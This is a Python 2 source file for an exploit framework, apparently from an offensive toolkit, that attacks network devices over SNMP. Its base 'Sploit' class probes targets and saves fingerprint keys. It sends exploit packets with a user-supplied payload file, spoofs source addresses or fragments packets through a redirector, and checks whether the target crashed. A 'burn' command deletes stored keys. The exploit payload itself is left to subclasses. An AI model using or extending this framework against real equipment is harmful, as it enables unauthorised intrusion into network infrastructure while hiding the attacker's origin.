#!/usr/bin/env python

import sys
import os

# Note: Need so that we can find the scapy code.
bindir = os.path.dirname(os.path.abspath(sys.argv[0]))
directory = '%s/..'%bindir
if not directory in sys.path:
    sys.path.insert(0, '%s/..'%bindir)

import socket
import argparse
import random
import struct
import traceback
import glob
from hexdump   import hexdump
from scapy.all import ASN1_OID, fragment, IP, SNMP, SNMPget, SNMPvarbind, UDP
from tempfile  import mkstemp

from log import Log




def public(f):
    '''

    '''
    return f
def internal(f):
    '''

    '''
    return f
def overridable(comment):
    '''

    '''
    def decorator(f): return f
    return decorator


class Sploit(object):
    '''














    '''

    DEFAULT_FRAGMENT_SIZE = 460

    def __init__(self, tool_name, tool_version):
        self.tool_name    = tool_name
        self.tool_version = tool_version

        self.terminateFlingOnException = False

        self.env      = argparse.Namespace()
        self.params   = argparse.Namespace()
        self.key_data = None
        self.vinfo    = None
        
        self.log = Log(self.tool_name, self.tool_version)
        self.log.open()
        
        self._init_parser()

    def __del__(self):
        self.log.close()
        self.log = None
        
    @property
    def description(self):
        '''

        '''
        return '%s (version %s)' % (self.tool_name, self.tool_version)
        
    def _init_parser(self):
        '''

        '''

        self.parser = argparse.ArgumentParser(description = self.description)


        self.subcommands = []
        self.setup_parser()
        subcommands = self.subcommands
        del self.subcommands
        

        if subcommands:
            subparsers = self.parser.add_subparsers()
            for subcommand in subcommands:
                subparser = subparsers.add_parser(subcommand.name)
                subparser.set_defaults(subcommand = subcommand)
                subcommand.setup_parser(subparser)
    
    @public
    def add_subcommand(self, subcommand):
        '''

        '''
        self.subcommands.append(subcommand)
        
    @internal
    @overridable("Overrides must call base implementation first")
    def setup_parser(self):
        '''



        '''
        self.add_logging_params(self.parser)

    @internal
    def create_socket(self, ip = None, port = None, timeout = None):
        '''

        '''
        if self.params.redir:
            exsock = FragmentingPseudoSocket(self.params.dst['ip'], self.params.dst['port'], **self.params.redir)
            exsock.fragment_size = self.params.fragment_size or self.DEFAULT_FRAGMENT_SIZE
            exsock.raw_send      = self.params.raw_send
        else:
            exsock = PseudoSocket(self.params.dst['ip'], self.params.dst['port'])
        exsock.timeout = self.params.timeout
        exsock.verbose = self.params.verbose
        exsock.log     = self.log
        return exsock
    
    @overridable("Overrides must call base implementation first")
    def pre_parse(self, args):
        '''

        '''
        

        self.params.args = args
        

        self.env.progname = args[0]
        self.env.progbase = os.path.basename(args[0])
        self.env.progpath = os.path.realpath(os.path.dirname(args[0]))
        
    def _parse(self, args):
        '''

        '''
        

        self.pre_parse(args)
        

        self.parser.parse_args(args[1:], self.params)
        

        try:
            self.post_parse()
        except argparse.ArgumentError, e:

            self.parser.error(str(e))
    
    @overridable("Overrides must call base implementation first")
    def post_parse(self):
        '''

        '''


        defaults = {'healthcheck':     False,
                    'healthcheckport': None,
                    'key':             None,
                    'redir':           None,
                    'fragment_size':   None,
                    'subcommand':      None,
                   }
        for param in defaults:
            if not hasattr(self.params, param):
                setattr(self.params, param, defaults[param])
        

        self.params.debug = self.enable_debugging()
        if self.params.debug:
            self.params.Debug = self.params.verbose
        else:
            self.params.Debug = 0


        if not self.params.redir and self.params.fragment_size:
            Sploit.parse_error('The fragment size can only be specified when --redirect or --spoof is used.')
            

        if self.params.healthcheckport:
            if not self.params.healthcheck:
                Sploit.parse_error('The TCP port for health checks was specified without enabling health checks.')
        else:
            if self.params.redir and not self.params.redir['listen_port'] and self.params.healthcheck:
                Sploit.parse_error('Health checks are not currently supported when spoofing the source address.  You must include the --no-health-check option.')


        if self.params.key and not os.path.isfile(self.get_key_file()):
            Sploit.parse_error("Key file '%s' does not exist" % self.params.key)
            

        if self.params.subcommand:
            self.params.subcommand.post_parse(self.params)

    @internal
    @staticmethod
    def parse_error(msg):
        '''

        '''
        raise argparse.ArgumentError(None, msg)
        
    @public
    @staticmethod
    def add_connection_params(parser, include_spoof = True):
        '''

        '''
        parser.add_argument('-t','--target',
                            dest     = 'dst',
                            required = True,
                            type     = _parse_target,
                            help     = 'target ip[:port]')
        if include_spoof:
            parser.add_argument('--spoof',
                                dest    = 'redir',
                                metavar = 'redir_ip:redir_port:spoofed_ip[:spoofed_port]',
                                type    = lambda x: _parse_redirect(x, False),
                                default = None,
                                help    = 'send spoofed src packet (with no response expected)')
        parser.add_argument('--fragment',
                            dest    = 'redir',
                            metavar = 'outbound_tunnel_local_ip:outbound_tunnel_local_port:return_tunnel_remote_ip:return_tunnel_remote_port:listen_port',
                            type    = lambda x: _parse_redirect(x, True),
                            default = None,
                            help    = 'send fragmented packet through redirector (expecting a response)')
        parser.add_argument('--fragment-size',
                            dest     = 'fragment_size',
                            type     = int,
                            default  = None,
                            help     = 'maximum fragment size')
        parser.add_argument('--nopen-rawsend',
                            dest    = 'raw_send',
                            action  = 'store_true',
                            default = False,
                            help    = 're-open the connection for each fragment')
        parser.add_argument('--no-nopen-rawsend',
                            dest    = 'raw_send',
                            action  = 'store_false',
                            default = False,
                            help    = 'use the same connection for each fragment')
        parser.add_argument('-c','--community',
                            dest     = 'community',
                            required = True,
                            help     = 'community string')
        parser.add_argument('--version',
                            dest    = 'version',
                            choices = ['v1','v2c'],
                            default = 'v2c',
                            help    = 'snmp version v1|v2c defaults to v2c')
        parser.add_argument('-w','--wait','--timeout',
                            dest    = 'timeout',
                            type    = int,
                            default = 30,
                            help    = 'sets timeout for connections')
        
    @public
    @staticmethod
    def add_logging_params(parser):
        '''

        '''
        parser.add_argument('-v','--verbose',
                            dest    = 'verbose',
                            action  = 'count',
                            default = 1,
                            help    = 'verbose logging, add more -v for more verbose logging')
        parser.add_argument('-q','--quiet',
                            dest   = 'verbose',
                            action = 'store_const',
                            const  = 0,
                            help   = 'minimize logging (not recommended)')

    @public
    @staticmethod
    def add_key_params(parser):
        '''

        '''
        parser.add_argument('-k', '--key',
                            dest = 'key',
                            help = "info key - returned from info query")

    @public
    @staticmethod
    def add_healthcheck_params(parser):
        '''

        '''
        parser.add_argument('--health-check',
                            dest    = 'healthcheck',
                            action  = 'store_true',
                            default = True,
                            help    = 'enable health checks (default)')
        parser.add_argument('--no-health-check',
                            dest    = 'healthcheck',
                            action  = 'store_false',
                            default = True,
                            help    = "disable health checks")
        parser.add_argument('--health-check-port',
                            dest    = 'healthcheckport',
                            type    = _parse_port,
                            default = None,
                            help    = "TCP port to use for health checks")
        
    @overridable("Overrides don't need to call base implementation")
    def enable_debugging(self):
        '''

        '''
        return False

    @public
    def launch(self, args):
        '''

        '''
        
        self._parse(args)
        self.log('parsed', CommandLine = args)
        

        print "[+] Executing: "," ".join(args)
        if self.params.verbose > 1:
            print "[+] running from %s" % self.env.progpath

        if self.params.subcommand:
            self.params.subcommand.run(self)
        else:
            self.run()

    @overridable("Should only be overriden for derived classes that don't use subcommands")
    def run(self):
        '''

        '''
        raise NotImplementedError, "Sploit-based classes that don't use subcommands need to override the run method."        
    
    @overridable("If overriden, the base implementation does not need to be called.")
    def get_key_dir(self):
        '''

        '''
        return '%s/keys' % self.env.progpath
        
    def get_key_file(self, key = None):
        '''

        '''
        if not key:
            key = self.params.key
        return '%s/%s.key' % (self.get_key_dir(), key)

    @overridable("Must be overriden if the target will be touched.  Base implementation should not be called.")
    def generate_touch(self):
        '''

        '''
        raise NotImplementedError, "Sploit-based classes need to override the generate_touch method."        
        
    @internal
    def send_touch(self, packet = None, exsock = None, attempts = 1):
        '''

        '''
        
        print '[+] probing target via snmp'
        
        if not packet:
            packet = self.generate_touch()

        try:
            if not exsock:
                print "[+] Connecting to %s:%s" % (self.params.dst['ip'], self.params.dst['port'])
                exsock = self.create_socket()
    
            while attempts:
                attempts -= 1
                

                self.log.packet('sending touch packet', str(packet))
                exsock.send(packet)
                self.log('sent touch packet')

                
                try:
                    while 1:
                        print '*'*40

                        self.log('receiving touch response')
                        response = exsock.receive(2048)
                        self.log.packet('received touch response', response)

                        if self.params.verbose > 1:
                            print '[+] Data returned'
                            hexdump(response)
                            SNMP(response).show()
                            print '[+] End of  Data returned\n'
                        
                        if self.post_touch(response):
                            return True
                        else:
                            print response
                            print '*'*40
                            print 'listening for responses - Ctrl-C to exit'

                except KeyboardInterrupt:
                    return False
                except socket.timeout:
                    if not attempts:
                        return False
                
                print 'Retrying...'
                    
        except Exception,message:

            print '\nExiting ...'

            print 'Debug info ','='*40
            traceback.print_exc()
            print 'Debug info ','='*40

            raise RuntimeError,message

    @overridable("Must be overriden if the target will be touched.  Base implementation should not be called.")
    def post_touch(self, response):
        '''


        '''
        raise NotImplementedError, "Sploit-based classes need to override the post_touch method."        

    @overridable("Should be overriden if the 'info' or 'force' subcommands will be used.  Base implementation should be called.")
    def report_key(self, key):
        '''

        '''
        pass

    @overridable("Should be overriden if checks need to be done before the exploit is called.")
    def pre_exploit(self):
        '''


        '''
        pass
        
    @overridable("Must be overriden.  Base implementation should not be called.")
    def generate_exploit(self):
        '''

        '''
        raise NotImplementedError, "Sploit-based classes need to override the generate_exploit method."        

    @internal
    def send_exploit(self, packets = None, exsock = None):
        '''

        '''

        if not packets:
            packets = self.generate_exploit()
        
        if not exsock:
            print "[+] Connecting to %s:%s" % (self.params.dst['ip'], self.params.dst['port'])
            exsock = self.create_socket()
        
        try:
            tail = ' of %d' % len(packets)
        except TypeError:
            tail =' of N'

        cur = 1
        for packet in packets:
            print "[+] packet %d%s"%(cur,tail)



            try:
                packet = packet[SNMP]
            except:
                pass
                
            if self.params.verbose:
                hexdump(str(packet))
            if self.params.verbose > 1:
                packet.show()

            self.log.packet('sending exploit packet', str(packet))
            exsock.send(packet)
            self.log('sent exploit packet')
            
            if exsock.expecting_response:
                try:
                    if self.params.verbose:
                        print '*'*40
                        
                    self.log('receiving exploit response')
                    response = exsock.receive(2048)
                    self.log.packet('sent exploit packet', response)
                    
                    if self.post_exploit(response):
                        print "[+] clean return detected"
                    elif self.params.healthcheck:
                        print "[-] unexpected response received - performing health check"
                        self.perform_healthcheck(exsock)
                    else:
                        print "[-] unexpected response received"
                    
                except KeyboardInterrupt,e:
                    print "[-] keyboard interrupt before response received"
                    if self.terminateFlingOnException:
                        raise KeyboardInterrupt,e
                except socket.timeout,e:
                    okay = False
                    if self.params.healthcheck:
                        print "[-] timeout waiting for response - performing health check"
                        okay = self.perform_healthcheck(exsock)
                    else:
                        print "[-] timeout waiting for response - target may have crashed"
                    if not okay and self.terminateFlingOnException:
                        raise socket.timeout,e
            elif self.params.healthcheck:
                print "[+] not expecting response - performing health check"
                self.perform_healthcheck(exsock)
            else:
                print "[+] not expecting response"
            
            cur += 1

    @overridable("Overrides do not need to call the base implementation")
    def post_exploit(self, response):
        '''


        '''
        snmp = SNMP(response)
        if self.params.verbose:
            snmp.show()
        if self.params.verbose > 1:
            hexdump(response)

        print "[+] response received"
        return True
    
    @internal
    def perform_healthcheck(self, exsock):
        '''

        '''
        healthy = False
        
        if self.params.healthcheckport:
            healthy = exsock.establish_tcp_connection(self.params.healthcheckport)
        else:

            oid = '1.3.6.1.2.1.1.3.0'
            pkt = SNMP(community=self.params.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID(oid))]))
            exsock.send(pkt[SNMP])
                
            try:
                response = exsock.receive(2048)
                healthy = True
                    
            except KeyboardInterrupt,e:
                print "[-] keyboard interrupt before response received"
                if self.terminateFlingOnException:
                   raise KeyboardInterrupt,e
            except socket.timeout,e:
                okay = False
                print "[-] no response from health check - target may have crashed"
                if not okay and self.terminateFlingOnException:
                   raise socket.timeout,e

        if healthy:
            print "[+] health check succeeded"
        else:
            print "[-] health check failed"
            
        return healthy
        

class Subcommand(object):
    @overridable("Overrides should call base implementation first")
    def setup_parser(self, parser):
        '''

        '''
        Sploit.add_logging_params(parser)
        
    @overridable("Overrides should call base implementation first")
    def post_parse(self, params):
        '''

        '''
        pass
    
    @overridable("Overrides don't need to call base implementation")
    def run(self, exp):
        '''

        '''
        pass
    

class _KeyCreationSubcommand(Subcommand):
    @overridable("Overrides should call base implementation first")
    def setup_parser(self, parser):
        super(_KeyCreationSubcommand, self).setup_parser(parser)
        
    @overridable("Overrides don't need to call base implementation")
    def run(self, exp):
        self.get_key_data(exp)
        
        exp.load_vinfo()


        if not os.path.isdir(exp.get_key_dir()):
            os.mkdir(exp.get_key_dir())
        fd, filename = mkstemp(dir = exp.get_key_dir(), prefix='', suffix='.key')
        os.write(fd, exp.key_data + '\n')
        key = filename.split('/')[-1][:-4]
        os.close(fd)
        
        exp.report_key(key)
        
    @overridable("Must be overriden.  Base implementation should not be called.")
    def get_key_data(self, exp):
        raise NotImplementedError, "_KeyCreationSubcommand derived classes must override the get_key_data method."
        
        
class ForceSubcommand(_KeyCreationSubcommand):

    name  = 'force'
    label = 'key_data'
    help  = 'data used to populate the key file'
    
    @overridable("Overrides should call base implementation first")
    def setup_parser(self, parser):
        super(ForceSubcommand, self).setup_parser(parser)
        parser.add_argument(dest    = 'key_data',
                            metavar = self.label,
                            help    = self.help)

    def get_key_data(self, exp):
        exp.key_data = exp.params.key_data
    
        
class InfoSubcommand(_KeyCreationSubcommand):
    name = 'info'
    
    @overridable("Overrides should call base implementation first")
    def setup_parser(self, parser):
        super(InfoSubcommand, self).setup_parser(parser)
        Sploit.add_connection_params(parser, include_spoof=False)
    
    def get_key_data(self, exp):
        if not exp.send_touch():
            raise RuntimeError, '[-] Touch failed.'
        

class ExecSubcommand(Subcommand):

    name = 'exec'
    perform_health_check     = True
    expect_filename_argument = True
    filename_label = 'filename'
    filename_help  = 'payload used for the exploit'

    @overridable("Overrides should call base implementation first")
    def setup_parser(self, parser):
        super(ExecSubcommand, self).setup_parser(parser)
        Sploit.add_connection_params(parser)
        Sploit.add_key_params(parser)
        if self.expect_filename_argument:
            def file_exists(filename):
                if not os.path.isfile(filename):
                    Sploit.parse_error("The file '%s' does not exist." % filename)
                return filename
            parser.add_argument(dest    = 'filename',
                                metavar = self.filename_label,
                                type    = file_exists,
                                help    = self.filename_help)
        if self.perform_health_check:
            Sploit.add_healthcheck_params(parser)
        
    @overridable("Overrides don't need to call base implementation")
    def run(self, exp):

        if exp.params.key:
            with open(exp.get_key_file(),'r') as keyfile:
                exp.key_data = keyfile.readline().strip()
        else:
            if not exp.send_touch():
                raise RuntimeError, '[-] Touch failed. Aborting.'
        
        exp.load_vinfo()
        
        exp.pre_exploit()
        exp.send_exploit()
        

class BurnSubcommand(Subcommand):
    name = 'burn'
 
    @overridable("Overrides should call base implementation first")
    def setup_parser(self, parser):
        '''

        '''
        super(BurnSubcommand, self).setup_parser(parser)
        group = parser.add_mutually_exclusive_group(required = True)
        Sploit.add_key_params(group)
        group.add_argument('--all','--Burn', 
                           action  = 'store_true',
                           dest    = 'burnburn',
                           default = False,
                           help    = "remove all keys")
    
    @overridable("Overrides don't need to call base implementation")
    def run(self, exp):
        '''

        '''
        if not exp.params.burnburn:

            keys = '%s/%s.key' % (exp.get_key_dir(), exp.params.key)
        else:
            keys = '%s/*.key' % exp.get_key_dir()

        l = glob.glob(keys)
        for f in l:
            print '[+] deleting %s' % f
            os.unlink(f)


class PseudoSocket(object):
    def __init__(self, target_ip, target_port):
        self.target_ip   = target_ip
        self.target_port = target_port
        self.timeout     = 30
        self.verbose     = 1
        self.sock        = None
        self.log         = None
        
    def create(self):
        try:
            msg = "getaddrinfo returns an empty list"
            for res in socket.getaddrinfo(self.target_ip, self.target_port, 0, socket.SOCK_DGRAM):
                af, socktype, proto, canonname, sa = res
                try:
                    sock = socket.socket(af, socktype, proto)
                    sock.settimeout(self.timeout)
                    sock.connect(sa)
                except socket.error, msg:
                    if sock:
                        sock.close()
                        sock = None
                        continue
                    break
                if not sock:
                    raise socket.error, msg
        except socket.error:
            raise RuntimeError,'[+] Cannot connect to %s:%d\n[+] port might not be up' % (self.target_ip, self.target_port)
        return sock

        
    def send(self, packet):
        if not self.sock:
            self.sock = self.create()
        
        self.sock.sendall(str(packet))
        
    def receive(self, bytes):
        if not self.sock:
            self.sock = self.create()
        
        return self.sock.recv(bytes)
        
    def close(self):
        if self.sock:
            self.sock.close()
            self.sock = None

    @property
    def expecting_response(self):
        return True
        
    @property
    def destination_ip(self):
        return self.target_ip
        
    def establish_tcp_connection(self, port):
        ret = False
        try:
            sock = socket.socket()
            sock.settimeout(self.timeout)
            sock.connect((self.destination_ip, port))
            sock.sendall('\n')
            response = sock.recv(10)
            ret = True
        except socket.error:
            pass
        finally:
            if sock:
                sock.close()
        return ret
        
class FragmentingPseudoSocket(PseudoSocket):
    def __init__(self, target_ip, target_port, outbound_ip, outbound_port, return_ip, return_port, listen_port):
        super(FragmentingPseudoSocket, self).__init__(target_ip, target_port)
        self.outbound_ip   = outbound_ip
        self.outbound_port = outbound_port
        self.return_ip     = return_ip
        self.return_port   = return_port or random.randint(2048,65500)
        self.listen_port   = listen_port
        self.fragment_size = Sploit.DEFAULT_FRAGMENT_SIZE
        self.raw_send      = False

    def create(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        sock.settimeout(self.timeout)
        sock.connect((self.outbound_ip, self.outbound_port))
        return sock
        
    def send(self, packet):
        original_packet = IP(dst=self.target_ip,src=self.return_ip)/UDP(dport=self.target_port,sport=self.return_port)/packet
        if self.verbose > 1:
            print "Original packet:"
            original_packet.show()
        hexdump(str(original_packet))
       
        fragments = fragment(original_packet, fragsize = self.fragment_size)
        try:
            i = 1
            for frag in fragments:
                if self.verbose > 1:
                    print "Fragment %d of %d:" % (i, len(fragments))
                    frag.show()
                frag = str(frag)
                length = struct.pack(">I", len(frag))

                if not self.sock:
                    print '[+] connecting ...'
                    self.sock = self.create()
                   
                print '[+] sending part %d of %d now..' % (i, len(fragments))
                hexdump(frag)
                if self.log:
                    self.log.packet('sending fragment %d of %d' % (i, len(fragments)), frag)
                self.sock.send(length)
                self.sock.send(frag)
                if self.log:
                    self.log('sent fragment %d of %d' % (i, len(fragments)))
                i += 1
                
                if self.raw_send:

                    if self.log:
                        self.log('forcing a new connection due to raw_send flag')
                    self.close()
               
        except KeyboardInterrupt,e:
            print "[-] keyboard interrupt while connecting/sending to redirector"
            raise KeyboardInterrupt,e
        except socket.timeout,e:
            print "[-] timeout while connecting/sending to redirector"
            raise socket.timeout,e
        finally:
            self.close()
        
    def receive(self, bytes):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.bind(("", self.listen_port))
            response = sock.recv(bytes)
            sock.close()
            return response
        except:
            if sock:
                sock.close()
            raise
        
    @property
    def expecting_response(self):
        return True if self.listen_port else False
        
    @property
    def destination_ip(self):
        return self.outbound_ip
        

def _parse_ip(ip):
    '''

    '''
    try:
        x = socket.inet_aton(ip)
        return socket.inet_ntoa(x)
    except:
        Sploit.parse_error("'%s' is an invalid IP address" % ip)
    
def _parse_port(port):
    '''

    '''
    try:
        return int(port)
    except:
        Sploit.parse_error("'%s' is an invalid port" % port)

        
def _parse_target(text):
    '''

    '''
    parts = text.split( ':' )
    if len(parts) == 2:
        return {'ip': _parse_ip(parts[0]), 'port': _parse_port(parts[1])}
    else:
        return {'ip': _parse_ip(text), 'port': 161}
    
def _parse_redirect(text, expect_response):
    '''



    '''
    parts = text.split(':')
    if expect_response and len(parts) != 5:
        Sploit.parse_error('the --redirect option requires 5 fields as follows outbound_tunnel_local_ip:outbound_tunnel_local_port:return_tunnel_remote_ip:return_tunnel_remote_port:listen_port')
    if not expect_response and not (3 <= len(parts) <= 4):
        Sploit.parse_error('the --spoof option requires 3 or 4 fields as follows redir_ip:redir_port:spoofed_ip[:spoofed_srcport]')

    redir = {}
    redir['outbound_ip']   = _parse_ip(parts[0])
    redir['outbound_port'] = _parse_port(parts[1])
    redir['return_ip']     = _parse_ip(parts[2])
    redir['return_port']   = _parse_port(parts[3]) if (len(parts) > 3) else None
    redir['listen_port']   = _parse_port(parts[4]) if (len(parts) > 4) else None
    return redir


if __name__ == '__main__':
    import unittest
    import sploit_test
    runner = unittest.TextTestRunner()
    runner.run(sploit_test.suite)
    
